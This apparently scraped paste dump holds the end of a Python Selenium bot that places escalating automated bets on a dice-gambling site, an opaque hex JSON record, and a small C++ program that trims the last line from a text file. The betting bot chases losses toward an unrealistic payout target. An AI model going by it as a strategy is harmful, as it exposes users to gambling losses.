        snowie = 0
        silvery = belance
    if (((belance-(nice*2))<=0) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        silvery = belance
        goldern = 2
        funny = True
        joke = ((math.ceil(belance/tens))*tens)
    if ((nice>=(love*goldern)) and (funny==False)):
        joke = ((math.ceil(belance/hundreds))*hundreds)
        funny = True
    if ((nice>=(love*goldern)) and (funny==True) and (belance>=joke) and (belance<(((math.floor(belance/tens))*tens)+sevens))):
        nice = love
        snowie = 0
        goldern = 4
        silvery = belance
        funny = False
        joke = 144000000
    if (belance<silvery):
        silvery = belance
    if (belance >= (original * 144000)):
        print(""winner winner chicken dinner"")
        return
    time.sleep(0.1)
    number = float(nice)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
hSpfCCfN,data905,TestGuy1,JSON,Tuesday 23rd of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '261169227e6ba3f26712e7dc01e5bbb31c24052554b64e143f88e12784cc9844bf3bce13a8383d6efcf3726602b6d5d6924d9b2befc26462010eb97f27aab166640182412bf48fa7e3547d2e99ac4330f354480134a86851d563cde79472a6234d3187241b7c7252906c0ef4de23d4ff96372345a57c737a9a9e308e64e7c849',
  otherdata: [
    '2abf930557bbc5859d3dc46af950e974',
    '77975a4abce10b22393fe67bc9c56674',
    'e922d266ca99eadc9012220e854eef3a',
    '6f86469be9da23a217e2c39037b58799',
    'c2d4d27ae03feb8d830c5e4c5cd14140',
    '8cbf80865038581b5a032092b2f88150',
    '18992e42236acf6eb7011bbc040dcc42',
    '9d23452b353d5c56bdc54cad825350e8'
  ]
}"
XPGHqcAy,Untitled,35657,C++,Tuesday 23rd of April 2024 05:51:25 AM CDT,"#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>

using namespace std;


int main() {

    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    ifstream fin;
    fin.open(""file.txt"");

    ofstream fout;
    fout.open(""temp.txt"");

    if (!fin.is_open() || !fout.is_open()) {
        cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
    }
    else {
        string str;
        getline(fin, str);
        if (!fin.eof()) {
            fout << str;
        }
        while (getline(fin, str)) {
            if (!fin.eof()) {
                fout << endl << str;
            }
        }

        fin.close();
        fout.close();
        remove(""file.txt"");
        rename(""temp.txt"", ""file.txt"");
    }
}"
